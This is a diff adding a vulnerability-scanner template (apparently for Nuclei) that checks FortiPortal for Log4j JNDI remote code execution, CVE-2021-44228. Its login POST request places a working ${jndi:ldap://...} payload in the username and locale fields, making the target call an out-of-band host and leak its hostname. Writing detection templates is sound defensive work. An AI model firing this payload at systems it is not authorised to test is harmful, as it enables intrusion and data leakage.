@@ -1,0 +1,64 @@
+id: fortiportal-log4j-rce
+
+info:
+  name: FortiPortal - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser, yaser_s
+  severity: critical
+  description: |
+    FortiPortal is susceptible to Log4j JNDI remote code execution. FortiPortal provides comprehensive security management and analytics within a multi-tenant, multi-tier management framework.
+  reference:
+    - https://www.fortiguard.com/psirt/FG-IR-21-245
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+  tags: cve,cve2021,rce,jndi,log4j,fortiportal,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        POST /fpc/login/ HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Accept: application/json, text/plain, */*
+        Referer: {{RootURL}}/fpc/app/login
+        Content-Type: application/json
+        Connection: close
+
+        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}","password":"aa","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
